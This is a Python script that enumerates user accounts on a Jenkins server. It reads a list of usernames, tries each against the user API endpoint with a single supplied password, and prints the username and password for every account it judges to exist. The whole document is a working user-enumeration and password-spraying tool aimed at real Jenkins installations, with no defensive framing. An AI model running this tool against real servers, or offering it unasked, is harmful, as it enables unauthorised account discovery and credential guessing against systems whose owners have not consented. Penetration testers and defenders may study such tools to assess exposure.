import requests
import argparse
from requests.auth import HTTPBasicAuth

# ANSI escape codes for colored text
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

def check_user_exists(jenkins_url, username, password):
    """
    Check if a Jenkins user exists by attempting to access their profile.
    If we get a 200 response, the user exists; if we get a 404, the user does not exist.
    If we get a 403, the user exists but lacks permissions.
    """
    # Construct the API URL to access the user profile
    user_api_url = f"{jenkins_url}/user/{username}/api/json"
    
    # Attempt to get the user profile with basic authentication
    try:
        response = requests.get(user_api_url, auth=HTTPBasicAuth(username, password))
        
        if response.status_code == 200:
            # User exists and we could authenticate successfully
            return True
        elif response.status_code == 404:
            # User does not exist
            return False
        elif response.status_code == 403:
            # User exists but lacks permissions to access the profile
            return True
        else:
            # Authentication failed (wrong password or other issues)
            return False
    except requests.RequestException as e:
        return False


if __name__ == "__main__":
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Check if a Jenkins user exists by attempting to log in.")
    parser.add_argument("--url", required=True, help="Jenkins server URL (e.g., http://your_jenkins_url)")
    parser.add_argument("--userfile", required=True, help="File containing usernames (one per line)")
    parser.add_argument("--password", required=True, help="Password to use for authentication")

    # Parse arguments
    args = parser.parse_args()

    # Read usernames from the provided file
    try:
        with open(args.userfile, 'r') as file:
            usernames = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"[-] File '{args.userfile}' not found.")
        exit(1)

    # Iterate over each username and check if it exists
    print(f"{GREEN}[+] {RESET}Checking users")
    print(f"{GREEN}[+] {RESET}Jenkins Usernames must only contain alphanumeric characters, underscore and dash")
    print(f"{GREEN}[+] {RESET}Ensure your list matches")
    for username in usernames:
        if username:  # Skip empty lines
            user_exists = check_user_exists(args.url, username, args.password)
            
            if user_exists:
                # Highlight username and password in yellow if user exists
                print(f"{YELLOW}{username}{RESET}:{RED}{args.password} {RESET}exists{RESET}")
     
           
